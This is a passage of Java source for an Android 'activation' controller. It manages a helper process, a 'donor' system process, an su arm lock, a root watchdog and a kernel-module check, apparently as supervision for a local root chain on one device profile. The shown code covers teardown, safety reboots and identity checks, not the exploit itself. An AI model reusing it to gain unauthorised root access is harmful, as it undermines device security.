            if (line.startsWith(terminalPrefix)) {
                return new Frame(lines, line.substring(terminalPrefix.length()));
            }
            lines.add(line);
        }
        throw new ActivationFailure("socket-frame", true,
                "The helper response exceeded its fixed limit");
    }

    private String readSocketLine(int limit) throws Exception {
        require(socketInput != null, "socket-read", mutationObserved,
                "The helper transport is closed");
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        while (output.size() < limit) {
            int value = socketInput.read();
            if (value < 0) {
                throw new ActivationFailure("socket-read", mutationObserved,
                        "The helper transport closed early");
            }
            if (value == '\n') {
                return output.toString(StandardCharsets.UTF_8.name());
            }
            output.write(value);
        }
        throw new ActivationFailure("socket-read", mutationObserved,
                "The helper response line is too large");
    }

    private String waitForHelperLine(String expected, long timeout) throws Exception {
        long deadline = elapsed() + timeout;
        while (elapsed() < deadline) {
            String log = readHelperLog();
            if (linePresent(log, expected)) {
                return expected;
            }
            if (helperProcess != null && !helperProcess.isAlive()) {
                throw new ActivationFailure("helper-exit", mutationObserved,
                        "The activation helper exited early");
            }
            Thread.sleep(25);
        }
        throw new ActivationFailure("helper-marker", mutationObserved,
                "Timed out waiting for a helper marker");
    }

    private String waitForHelperPrefix(String prefix, long timeout) throws Exception {
        long deadline = elapsed() + timeout;
        while (elapsed() < deadline) {
            String line = uniqueLineWithPrefix(readHelperLog(), prefix, false);
            if (!line.isEmpty()) {
                return line;
            }
            if (helperProcess != null && !helperProcess.isAlive()) {
                throw new ActivationFailure("helper-exit", mutationObserved,
                        "The activation helper exited early");
            }
            Thread.sleep(25);
        }
        throw new ActivationFailure("helper-marker", mutationObserved,
                "Timed out waiting for a helper proof");
    }

    private String uniqueHelperPrefix(String prefix) throws Exception {
        String line = uniqueLineWithPrefix(readHelperLog(), prefix, true);
        require(!line.isEmpty(), "helper-proof", true,
                "A required helper proof is missing");
        return line;
    }

    private static String uniqueLineWithPrefix(
            String text, String prefix, boolean required) throws ActivationFailure {
        String found = "";
        for (String line : text.split("\\n")) {
            if (line.startsWith(prefix)) {
                if (!found.isEmpty()) {
                    throw new ActivationFailure(
                            "helper-proof-repeat", true,
                            "A helper proof was repeated");
                }
                found = line;
            }
        }
        if (required && found.isEmpty()) {
            throw new ActivationFailure("helper-proof", true,
                    "A helper proof is missing");
        }
        return found;
    }

    private String readHelperLog() throws Exception {
        return readText(HELPER_LOG, 2 * 1024 * 1024);
    }

    private void waitForShellFile(String path, String expected, long timeout)
            throws Exception {
        long deadline = elapsed() + timeout;
        while (elapsed() < deadline) {
            String value = "";
            try {
                value = readText(path, 4096).trim();
            } catch (Exception ignored) {}
            if (expected.equals(value)) {
                return;
            }
            Thread.sleep(25);
        }
        throw new ActivationFailure("shell-file", mutationObserved,
                "A fixed helper arm file did not become ready");
    }

    private void requireHelperIdentity(boolean unsafe) throws Exception {
        require(helperIsSameProcess() && sameBoot(), "helper-identity", unsafe,
                "The helper process binding changed");
    }

    private boolean helperIsSameProcess() {
        try {
            return helperPid > 0 && helperStart.equals(processStartTime(helperPid)) &&
                    helperCommandLine.equals(
                            readProcBytes(helperPid, "cmdline")
                                    .replace('\0', ' ').trim());
        } catch (Exception exception) {
            return false;
        }
    }

    private boolean sameBoot() {
        try {
            return bootId.equals(readText(
                    "/proc/sys/kernel/random/boot_id", 128).trim());
        } catch (Exception exception) {
            return false;
        }
    }

    private boolean moduleVisible() {
        try {
            String modules = fixedCommand("/system/bin/ls", "/sys/module");
            return Arrays.asList(modules.split("\\s+")).contains("lp3_ctlbuf_rescue");
        } catch (Exception exception) {
            return true;
        }
    }

    private void recover(boolean unsafe) {
        if (!unsafe) {
            controllerTrace("clean-recovery-enter");
            try {
                if (socketOutput != null) {
                    socketOutput.write(1);
                    socketOutput.flush();
                }
            } catch (Exception ignored) {}
            closeTransport();
            controllerTrace("clean-recovery-transport-closed");
            if (helperProcess != null && helperProcess.isAlive()) {
                helperProcess.destroy();
            }
            controllerTrace("clean-recovery-helper-retire-requested");
            try {
                if (app != null) {
                    app.closeSession();
                }
                controllerTrace("clean-recovery-app-close-pass");
            } catch (Exception exception) {
                controllerTrace("clean-recovery-app-close-fail type=" +
                        exception.getClass().getSimpleName());
            }
            try {
                disarmControllerWatchdog();
                controllerTrace("clean-recovery-watchdog-disarm-pass");
            } catch (Exception exception) {
                controllerTrace("clean-recovery-watchdog-disarm-fail type=" +
                        exception.getClass().getSimpleName());
                reporter.log("Controller safety lease could not be retired");
                triggerControllerWatchdog();
                requestConfirmedSafetyReboot();
            }
            return;
        }
        reporter.log("Unsafe partial state detected; requesting a safety reboot");
        triggerControllerWatchdog();
        requestConfirmedSafetyReboot();
    }

    private void requestConfirmedSafetyReboot() {
        while (!bootChanged()) {
            try {
                java.lang.Process reboot = new java.lang.ProcessBuilder(
                        "/system/bin/reboot")
                        .redirectErrorStream(true)
                        .start();
                reboot.waitFor(3, TimeUnit.SECONDS);
                if (reboot.isAlive()) {
                    reboot.destroyForcibly();
                }
            } catch (Exception ignored) {}
            try {
                Thread.sleep(3_000);
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            }
        }
        reporter.log("Safety reboot changed the boot identity");
    }

    private boolean bootChanged() {
        try {
            String current = readText(
                    "/proc/sys/kernel/random/boot_id", 128).trim();
            return current.matches(
                    "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                            "[0-9a-f]{4}-[0-9a-f]{12}") &&
                    !bootId.equals(current);
        } catch (Exception ignored) {
            return false;
        }
    }

    private void performSameBootProcessTeardown() throws Exception {
        reporter.phase(
                "same-boot-teardown",
                "Applying the validated same-boot acquisition reset");
        ActivationProofs.InitialAcquisitionMissProof proof =
                ActivationProofs.parseInitialAcquisitionMiss(
                        processTeardownResult,
                        processTeardownProgress,
                        processTeardownToken);
        require(processTeardownRequested && proof != null && proof.bindsTo(
                        bridgeNonce, bootId, helperPid, helperStart),
                "process-teardown-wrapper", true,
                "The process teardown result binding changed");
        requireControllerWatchdogIdentity();
        requireHelperIdentity(true);
        requireResetBaseline("process-teardown-preflight");
        controllerTrace("process-teardown-preflight-pass");

        Map<Integer, String> cohort = stablePrismAppCohort();
        requireTokenCohortBinding(proof, cohort);
        int supervisorPid = Process.myPid();
        String supervisorStart = processStartTime(supervisorPid);
        String supervisorCommand = readProcBytes(supervisorPid, "cmdline")
                .replace('\0', ' ').trim();
        require(!supervisorStart.isEmpty() &&
                        supervisorCommand.contains("prism_activation"),
                "supervisor-identity", true,
                "The shell activation supervisor identity is invalid");

        writeControllerJournal("TEARDOWN_VALIDATED");
        controllerTrace("process-teardown-journal-validated");
        retireHelperBeforeArmHolder("helper-teardown");
        controllerTrace("process-teardown-helper-retired");
        stopArmHolderVerified();
        controllerTrace("process-teardown-arm-holder-retired");
        app.close();
        app = null;
        controllerTrace("process-teardown-app-bridge-closed");
        fixedCommand(
                "/system/bin/am", "force-stop", "--user", "0", PACKAGE);
        controllerTrace("process-teardown-force-stop-pass");
        awaitAppCohortGone(cohort);
        controllerTrace("process-teardown-cohort-retired");
        require(supervisorStart.equals(processStartTime(supervisorPid)) &&
                        supervisorCommand.equals(readProcBytes(
                                supervisorPid, "cmdline").replace('\0', ' ').trim()),
                "supervisor-survival", true,
                "The activation supervisor did not survive app teardown");

        closeTransport();
        removeShellControlFiles();

        Thread.sleep(3_000);
        requireResetBaseline("process-teardown-postflight");
        require(oldCohortGone(cohort), "process-teardown-old-process", true,
                "An old app process survived process teardown");
        writeControllerJournal("RESET_VERIFIED");
        controllerTrace("process-teardown-reset-verified");

        completeProcessTeardownWithRetry();
        controllerTrace("process-teardown-receipt-pass");
        relaunchPrismBestEffort();
        reporter.log("Same-boot acquisition reset verified");
    }

    private void completeProcessTeardownWithRetry() throws Exception {
        long deadline = elapsed() + 20_000;
        String last = "unavailable";
        while (elapsed() < deadline) {
            require(sameBoot(), "process-teardown-complete-boot", true,
                    "The boot identity changed while completing teardown");
            requireControllerWatchdogIdentity();
            PrismAppBridgeClient candidate = null;
            try {
                candidate = PrismAppBridgeClient.connect(
                        context, session, bootId);
                String response = candidate.completeProcessTeardown(
                        processTeardownToken);
                if (response.startsWith("status=pass ")) {
                    candidate.close();
                    reporter.log("Process teardown completion receipt accepted");
                    return;
                }
                last = response;
            } catch (Exception exception) {
                last = exception.getClass().getSimpleName();
            } finally {
                if (candidate != null) {
                    candidate.close();
                }
            }
            Thread.sleep(100);
        }
        throw new ActivationFailure(
                "process-teardown-complete",
                true,
                "The idempotent teardown completion did not settle: " + last);
    }

    private void performVerifiedPreMutationReset() throws Exception {
        reporter.phase(
                "pre-mutation-reset",
                "Applying the verified pre-mutation retry reset");
        String result = readApp(PrismAppBridgeService.SIGNAL_RESULT);
        ActivationProofs.SafeAcquisitionMissProof proof =
                ActivationProofs.parseSafeAcquisitionMiss(
                        result, lastProgress);
        require(proof != null,
                "pre-mutation-wrapper", true,
                "The pre-mutation miss proof changed");
        require(safeResetDurable && safeResetRecord != null,
                "pre-mutation-proof-durable", false,
                "The no-mutation proof is not durable");
        requirePass(
                app.recordSafeMissReceipt(
                        result,
                        lastProgress,
                        safeResetRecord.binding()),
                "pre-mutation-safe-receipt",
                true);
        SafeResetCoordinator.writeJournal(
                safeResetRecord,
                SafeResetRecord.CHECKPOINT_APP_RECEIPT);
        reporter.log("Safe reset checkpoint: APP_RECEIPT");
        disarmControllerWatchdogForSafeReset();
        app.close();
        app = null;
        closeTransport();
        safeResetCompleted = new SafeResetCoordinator(
                context,
                safeResetRecord,
                reporter::log).complete();
        if (safeResetCompleted) {
            helperProcess = null;
            armHolder = null;
            reporter.log("Verified pre-mutation reset completed");
        } else {
            reporter.log("Verified no-mutation proof retained for cleanup resume");
        }
    }

    private void persistSafeMissProof(String result, String progress)
            throws Exception {
        safeResetRecord = SafeResetRecord.create(
                session,
                bootId,
                result,
                progress,
                helperPid,
                helperStart,
                armHolderPid,
                armHolderStart,
                donor.pid,
                donor.startTime,
                ueventd.pid,
                ueventd.startTime,
                rootChainCohort);
        SafeResetCoordinator.writeJournal(
                safeResetRecord,
                SafeResetRecord.CHECKPOINT_PROOF_DURABLE);
        safeResetDurable = true;
        reporter.log("Safe reset checkpoint: PROOF_DURABLE");
    }

    private void relaunchPrismBestEffort() {
        try {
            CommandResult result = runCommand(
                    "/system/bin/am", "start", "--user", "0", "-n",
                    PACKAGE + "/.PrismActivity");
            if (result.exit != 0) {
                reporter.log("Prism UI relaunch was deferred");
            }
        } catch (Exception exception) {
            reporter.log("Prism UI relaunch was deferred");
        }
    }

    private void requireResetBaseline(String phase) throws Exception {
        String gate = DeviceGate.verify(context);
        require("status=pass stage=device-gate profile=tlp301-00ww-1-440000"
                        .equals(gate) &&
                        sameBoot() && donor.isSameProcess() && ueventd.isSameProcess() &&
                        !moduleVisible() && registeredJobCount() < 1000,
                phase, true,
                "The same-boot device baseline changed");
        requireNormalDeviceHealth(phase + "-health", true);
    }

    private void requireExactPostflightBaseline(String phase) throws Exception {
        String gate = DeviceGate.verify(context);
        require(cleanupClaimedClean && helperRetired &&
                        "status=pass stage=device-gate "
                                .concat("profile=tlp301-00ww-1-440000")
                                .equals(gate) &&
                        sameBoot() && donor.isSameProcess() &&
                        ueventd.isSameProcess() && uniqueDonor() &&
                        !moduleVisible() && registeredJobCount() < 1000 &&
                        helperAndRootWatchdogAbsent(),
                phase, true,
                "The exact postflight process or profile baseline changed");
        requireNormalDeviceHealth(phase + "-health", true);
    }

    private boolean uniqueDonor() {
        try {
            String[] pids = fixedCommand(
                    "/system/bin/pidof", "update_engine").trim().split("\\s+");
            return pids.length == 1 &&
                    Integer.toString(donor.pid).equals(pids[0]) &&
                    donor.startTime.equals(processStartTime(donor.pid));
        } catch (Exception exception) {
            return false;
        }
    }

    private boolean helperAndRootWatchdogAbsent() {
        try {
            if (!processStartTime(helperPid).isEmpty()) {
                return false;
            }
            String processes = fixedCommand(
                    "/system/bin/ps", "-A", "-o", "PID,ARGS");
            return !processes.contains(HELPER_CLASS) &&
                    !new File(ROOT_WATCHDOG_ARM).exists();
        } catch (Exception exception) {
            return false;
        }
    }

    private static void requireNormalDeviceHealth(
            String phase, boolean unsafe) throws Exception {
        CommandResult result = runCommand(
                "/system/bin/dumpsys", "thermalservice");
        require(result.exit == 0, phase, unsafe,
                "The thermal service status is unavailable");
        Matcher status = Pattern.compile(
                "(?m)^Thermal Status: ([0-9]+)$").matcher(result.output);
        require(status.find() && "0".equals(status.group(1)) && !status.find(),
                phase, unsafe, "The device thermal status is unsafe");
        Matcher battery = Pattern.compile(
                "mValue=([0-9]+(?:\\.[0-9]+)?), mType=2, mName=battery")
                .matcher(result.output);
        require(battery.find() &&
                        Double.parseDouble(battery.group(1)) < 42.0,
                phase, unsafe, "The battery temperature is unsafe");
        Matcher cpus = Pattern.compile(
                "mValue=([0-9]+(?:\\.[0-9]+)?), mType=0, mName=CPU[0-9]+")
                .matcher(result.output);
        int cpuCount = 0;
        double maximum = Double.NEGATIVE_INFINITY;
        while (cpus.find()) {
            cpuCount++;
            maximum = Math.max(maximum, Double.parseDouble(cpus.group(1)));
        }
        require(cpuCount > 0 && maximum < 65.0, phase, unsafe,
                "The CPU temperature is unsafe");
    }

    private static int registeredJobCount() throws Exception {
        CommandResult result = runCommand(
                "/system/bin/dumpsys", "jobscheduler");
        if (result.exit != 0) {
            throw new IllegalStateException("jobscheduler-exit-" + result.exit);
        }
        Matcher matcher = Pattern.compile(
                "(?m)^Registered ([0-9]+) jobs:$").matcher(result.output);
        if (!matcher.find()) {
            throw new IllegalStateException("jobscheduler-count");
        }
        int count = Integer.parseInt(matcher.group(1));
        if (matcher.find()) {
            throw new IllegalStateException("jobscheduler-count-repeat");
        }
        return count;
    }

    private Map<Integer, String> stablePrismAppCohort() throws Exception {
        long deadline = elapsed() + 5_000;
        Map<Integer, String> previous = Collections.emptyMap();
        while (elapsed() < deadline) {
            Map<Integer, String> current = prismAppCohort();
            if (!current.isEmpty() && current.equals(previous)) {
                return current;
            }
            previous = current;
            Thread.sleep(100);
        }
        require(!previous.isEmpty(), "app-cohort-empty", harnessDispatchAttempted,
                "The Prism app process cohort is empty");
        throw new ActivationFailure(
                "app-cohort-unstable", harnessDispatchAttempted,
                "The Prism app process cohort is not stable");
    }

    private Map<Integer, String> prismAppCohort() throws Exception {
        int prismUid = context.getApplicationInfo().uid;
        String processes = fixedCommand(
                "/system/bin/ps", "-A", "-o", "PID,UID,ARGS");
        Map<Integer, String> result = new LinkedHashMap<>();
        for (String line : processes.split("\\n")) {
            String[] fields = line.trim().split("\\s+", 3);
            if (fields.length != 3 ||
                    !fields[0].matches("[1-9][0-9]*") ||
                    !fields[1].matches("[0-9]+")) {
                continue;
            }
            int pid = Integer.parseInt(fields[0]);
            int uid = Integer.parseInt(fields[1]);
            boolean packageLike = PACKAGE.equals(fields[2]) ||
                    fields[2].startsWith(PACKAGE + ":");
            if (uid == prismUid) {
                String start = processStartTime(pid);
                if (start.isEmpty()) {
                    Thread.sleep(10);
                    start = processStartTime(pid);
                }
                if (start.isEmpty()) {
                    boolean remains = Files.exists(Path.of("/proc/" + pid));
                    controllerTrace("app-cohort-identity-miss pid=" + pid +
                            " remains=" + (remains ? 1 : 0));
                    if (!remains) {
                        continue;
                    }
                    throw new ActivationFailure(
                            "app-cohort-identity", harnessDispatchAttempted,
                            "A Prism app process identity is unavailable");
                }
                result.put(pid, start);
            } else if (packageLike &&
                    !(uid == Process.SHELL_UID && pid == Process.myPid())) {
                throw new ActivationFailure(
                        "app-cohort-unexpected", harnessDispatchAttempted,
                        "An unexpected privileged Prism process is running");
            }
        }
        return result;
    }

    private void requireTokenCohortBinding(
            ActivationProofs.InitialAcquisitionMissProof proof,
            Map<Integer, String> cohort) throws ActivationFailure {
        Set<Integer> pids = new HashSet<>();
        for (ActivationProofs.TokenProcessIdentity identity : Arrays.asList(
                proof.harness(), proof.rawTarget(), proof.rawClient())) {
            int pid = Integer.parseInt(identity.pid());
            pids.add(pid);
            require(identity.startTime().equals(cohort.get(pid)),
                    "process-teardown-cohort", true,
                    "The process teardown token does not bind the app cohort");
        }
        require(pids.size() == 3, "process-teardown-cohort", true,
                "The process teardown identities are not unique");
    }

    private void awaitAppCohortGone(Map<Integer, String> cohort) throws Exception {
        long deadline = elapsed() + 20_000;
        int emptySamples = 0;
        while (elapsed() < deadline) {
            Map<Integer, String> current = prismAppCohort();
            if (current.isEmpty() && oldCohortGone(cohort)) {
                emptySamples++;
                if (emptySamples >= 2) {
                    return;
                }
            } else {
                emptySamples = 0;
            }
            Thread.sleep(200);
        }
        throw new ActivationFailure(
                "app-cohort-teardown", true,
                "The Prism app process cohort did not stop");
    }

    private static boolean oldCohortGone(Map<Integer, String> cohort) {
        for (Map.Entry<Integer, String> identity : cohort.entrySet()) {
            if (identity.getValue().equals(processStartTime(identity.getKey()))) {
                return false;
            }
        }
        return true;
    }

    private void closeTransport() {
        if (socket != null) {
            try {
                socket.close();
            } catch (Exception ignored) {}
        }
        socket = null;
        socketInput = null;
        socketOutput = null;
    }

    private void stopArmHolder() {
        if (armHolder == null) {
            return;
        }
        if (armHolder.isAlive()) {
            armHolder.destroy();
            try {
                if (!armHolder.waitFor(3, TimeUnit.SECONDS)) {
                    armHolder.destroyForcibly();
                    armHolder.waitFor(3, TimeUnit.SECONDS);
                }
            } catch (Exception ignored) {
                armHolder.destroyForcibly();
            }
        }
        armHolder = null;
    }

    private void stopArmHolderVerified() throws Exception {
        if (armHolder == null) {
            return;
        }
        CommandResult held = runCommand(
                "/system/bin/sh", "-c",
                "exec 0<" + SU_ARM + "; /system/bin/flock -n -x 0");
        require(held.exit == 1 && held.output.isEmpty() && armHolder.isAlive(),
                "command-arm-holder", true,
                "The command arm holder identity changed");
        require(armHolderPid > 0 &&
                        armHolderStart.equals(processStartTime(armHolderPid)),
                "command-arm-holder-identity", true,
                "The command arm holder process changed");
        stopArmHolder();
        CommandResult released = runCommand(
                "/system/bin/sh", "-c",
                "exec 0<" + SU_ARM + "; /system/bin/flock -n -x 0");
        require(released.exit == 0 && released.output.isEmpty(),
                "command-arm-release", true,
                "The command arm lock did not release");
    }

    private void retireHelperBeforeArmHolder(String phase) throws Exception {
        requireHelperIdentity(true);
        CommandResult killed = runCommand(
                "/system/bin/kill", Integer.toString(helperPid));
        require(killed.exit == 0, phase + "-signal", true,
                "The shell helper teardown signal failed");
        long deadline = elapsed() + 10_000;
        while (elapsed() < deadline && helperIsSameProcess()) {
            Thread.sleep(50);
        }
        require(!helperIsSameProcess(), phase, true,
                "The shell helper survived process teardown");
        helperProcess = null;
        reporter.log("Shell helper retired while the command arm remained held");
    }

    private void writeControllerJournal(String state) throws Exception {
        require(state.matches("[A-Z_]+") && sameBoot(),
                "controller-journal", true,
                "The controller journal state is invalid");
        String value = "version=1 state=" + state +
                " session=" + session +
                " boot_id=" + bootId +
                " bridge_nonce=" + bridgeNonce +
                " helper_pid=" + helperPid +
                " helper_start=" + helperStart + "\n";
        File temporary = new File(CONTROLLER_JOURNAL + ".tmp");
        try (FileOutputStream output = new FileOutputStream(temporary, false)) {
            output.write(value.getBytes(StandardCharsets.US_ASCII));
            output.getFD().sync();
        }
        Os.chmod(temporary.getAbsolutePath(), 0600);
        Os.rename(temporary.getAbsolutePath(), CONTROLLER_JOURNAL);
        require(value.equals(readText(CONTROLLER_JOURNAL, 4096)),
                "controller-journal", true,
                "The controller journal did not persist exactly");
    }

    static void controllerTrace(String marker) {
        try (FileOutputStream output = new FileOutputStream(
                CONTROLLER_TRACE, true)) {
            String line = elapsed() + " " + marker + "\n";
            output.write(line.getBytes(StandardCharsets.US_ASCII));
            output.getFD().sync();
        } catch (Exception ignored) {}
    }

    private static ProcIdentity readProc(int pid) throws Exception {
        return readProcAt(pid, "/proc/" + pid);
    }

    private static ProcIdentity readProcTask(int pid, int tid) throws Exception {
        return readProcAt(pid, "/proc/" + pid + "/task/" + tid);
    }

    private static ProcIdentity readProcAt(int processPid, String base)
            throws Exception {
        String status = readText(base + "/status", 64 * 1024);
        Map<String, List<String>> fields = new HashMap<>();
        for (String line : status.split("\\n")) {
            int separator = line.indexOf(':');
            if (separator > 0) {
                String value = line.substring(separator + 1).trim();
                fields.put(line.substring(0, separator), value.isEmpty()
                        ? Collections.emptyList()
                        : Arrays.asList(value.split("\\s+")));
            }
        }
        String context = readText(base + "/attr/current", 1024)
                .replace("\0", "").trim();
        String start = processStartTime(processPid);
        Map<String, String> namespaces = new HashMap<>();
        if (base.equals("/proc/" + processPid)) {
            File namespaceDirectory = new File(base + "/ns");
            String[] names = namespaceDirectory.list();
            if (names != null) {
                for (String name : names) {
                    namespaces.put(name, Files.readSymbolicLink(
                            Path.of(base, "ns", name)).toString());
                }
            }
        }
        return new ProcIdentity(processPid, start, context, fields, namespaces);
    }

    private static Set<Integer> taskIds(int pid) {
        String[] names = new File("/proc/" + pid + "/task").list();
        Set<Integer> result = new HashSet<>();
        if (names != null) {
            for (String name : names) {
                if (name.matches("[1-9][0-9]*")) {
                    result.add(Integer.parseInt(name));
                }
            }
        }
        return result;
    }

    private static String processStartTime(int pid) {
        try {
            String value = readText("/proc/" + pid + "/stat", 16 * 1024);
            int close = value.lastIndexOf(')');
            if (close < 0) {
                return "";
            }
            String[] fields = value.substring(close + 1).trim().split("\\s+");
            return fields.length > 19 && fields[19].matches("[0-9]+")
                    ? fields[19] : "";
        } catch (Exception exception) {
            return "";
        }
    }

    private static String readProcBytes(int pid, String name) throws Exception {
        byte[] bytes = Files.readAllBytes(Path.of("/proc", Integer.toString(pid), name));
        return new String(bytes, StandardCharsets.UTF_8);
    }

    private static String readTextIfPresent(String path, int limit) throws Exception {
        return new File(path).isFile() ? readText(path, limit) : "";
    }

    private static String fixedCommand(String... command) throws Exception {
        CommandResult result = runCommand(command);
        if (result.exit != 0) {
            throw new IllegalStateException("fixed-command-" + result.exit);
        }
        return result.output;
    }

    private static CommandResult runCommand(String... command) throws Exception {
        java.lang.Process process = new java.lang.ProcessBuilder(command)
                .redirectErrorStream(true).start();
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try (InputStream input = process.getInputStream()) {
            byte[] buffer = new byte[8192];
            int count;
            while ((count = input.read(buffer)) != -1) {
                if (output.size() + count > 2 * 1024 * 1024) {
                    process.destroyForcibly();
                    throw new IllegalStateException("command-output-limit");
                }
                output.write(buffer, 0, count);
            }
        }
        int exit = process.waitFor();
        return new CommandResult(
                exit, output.toString(StandardCharsets.UTF_8.name()).trim());
    }

    private static String readText(String path, int limit) throws Exception {
        File file = new File(path);
        if (!file.isFile() || file.length() > limit) {
            throw new IllegalStateException("read-limit");
        }
        try (FileInputStream input = new FileInputStream(file)) {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int count;
            while ((count = input.read(buffer)) != -1) {
                if (output.size() + count > limit) {
                    throw new IllegalStateException("read-limit");
                }
                output.write(buffer, 0, count);
            }
            return output.toString(StandardCharsets.UTF_8.name());
        }
    }

    private static Map<String, String> parseFields(String value) {
        Map<String, String> result = new LinkedHashMap<>();
        for (String item : value.trim().split(" ")) {
            int separator = item.indexOf('=');
            if (separator > 0 && separator < item.length() - 1 &&
                    !result.containsKey(item.substring(0, separator))) {
                result.put(
                        item.substring(0, separator),
                        item.substring(separator + 1));
            }
        }
        return result;
    }

    private static String unwrap(String line, String prefix) {
        return line.substring(prefix.length(), line.length() - 1);
    }

    private static long unsigned(String value) throws ActivationFailure {
        if (value == null) {
            throw new ActivationFailure("numeric-proof", true,
                    "A numeric proof field is missing");
        }
        try {
            return Long.parseUnsignedLong(
                    value.startsWith("0x") ? value.substring(2) : value,
                    value.startsWith("0x") ? 16 : 10);
        } catch (NumberFormatException exception) {
            throw new ActivationFailure("numeric-proof", true,
                    "A numeric proof field is malformed");
        }
    }

    private static boolean positive(String value) {
        try {
            return value != null && Integer.parseInt(value) > 0;
        } catch (NumberFormatException exception) {
            return false;
        }
    }

    private static boolean equalUnsignedOrText(String first, String second) {
        if (first == null || second == null) {
            return false;
        }
        try {
            return unsigned(first) == unsigned(second);
        } catch (ActivationFailure ignored) {
            return first.equals(second);
        }
    }

    private String randomHex(int bytes) {
        byte[] value = new byte[bytes];
        random.nextBytes(value);
        StringBuilder result = new StringBuilder(bytes * 2);
        for (byte item : value) {
            result.append(String.format(Locale.ROOT, "%02x", item & 0xff));
        }
        return result.toString();
    }

    private static String sha256(String value) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(
                    value.getBytes(StandardCharsets.UTF_8));
            StringBuilder result = new StringBuilder(digest.length * 2);
            for (byte item : digest) {
                result.append(String.format(
                        Locale.ROOT, "%02x", item & 0xff));
            }
            return result.toString();
        } catch (Exception exception) {
            return "";
        }
    }

    private static String traceToken(String value) {
        if (value == null || value.isEmpty()) {
            return "none";
        }
        StringBuilder token = new StringBuilder();
        for (int index = 0; index < value.length() && token.length() < 240;
             index++) {
            char character = value.charAt(index);
            token.append(Character.isLetterOrDigit(character) ||
                            "._:=/-".indexOf(character) >= 0
                    ? character : '_');
        }
        return token.toString();
    }

    private static boolean linePresent(String text, String expected) {
        for (String line : text.split("\\n")) {
            if (expected.equals(line)) {
                return true;
            }
        }
        return false;
    }

    private static long elapsed() {
        return android.os.SystemClock.elapsedRealtime();
    }

    private static void requirePass(String value, String phase, boolean unsafe)
            throws ActivationFailure {
        require(value != null && value.startsWith("status=pass "),
                phase, unsafe, "Activation gate failed: " + value);
    }

    private static void require(
            boolean condition, String phase, boolean unsafe, String message)
            throws ActivationFailure {
        if (!condition) {
            throw new ActivationFailure(phase, unsafe, message);
        }
    }

    private static final class ActivationFailure extends Exception {
        final String phase;
        final boolean unsafe;

        ActivationFailure(String phase, boolean unsafe, String message) {
            super(message);
            this.phase = phase;
            this.unsafe = unsafe;
        }
    }

    private static final class Frame {
        final List<String> lines;
        final String terminalValue;

        Frame(List<String> lines, String terminalValue) {
            this.lines = lines;
            this.terminalValue = terminalValue;
        }
    }

    private static final class CommandResult {
        final int exit;
        final String output;

        CommandResult(int exit, String output) {
            this.exit = exit;
            this.output = output;
        }
    }

    private static final class DonorSample {
        final String tids;
        final String states;

        DonorSample(String tids, String states) {
            this.tids = tids;
            this.states = states;
        }
    }

    private static final class ProcIdentity {
        final int pid;
        final String startTime;
        final String context;
        final Map<String, List<String>> fields;
        final Map<String, String> namespaces;

        ProcIdentity(
                int pid,
                String startTime,
                String context,
                Map<String, List<String>> fields,
                Map<String, String> namespaces) {
            this.pid = pid;
            this.startTime = startTime;
            this.context = context;
            this.fields = fields;
            this.namespaces = namespaces;
        }

        String field(String name) {
            List<String> values = values(name);
            return values.isEmpty() ? "" : values.get(0);
        }

        List<String> values(String name) {
            return fields.getOrDefault(name, Collections.emptyList());
        }

        boolean idsEqual(String name, int expected) {
            List<String> values = values(name);
            String text = Integer.toString(expected);
            return values.size() == 4 && values.stream().allMatch(text::equals);
        }

        String capEff16() {
            String value = field("CapEff").toLowerCase(Locale.ROOT);
            return String.format(Locale.ROOT, "%16s", value).replace(' ', '0');
        }

        boolean isSameProcess() {
            return startTime.equals(processStartTime(pid));
        }
    }
}
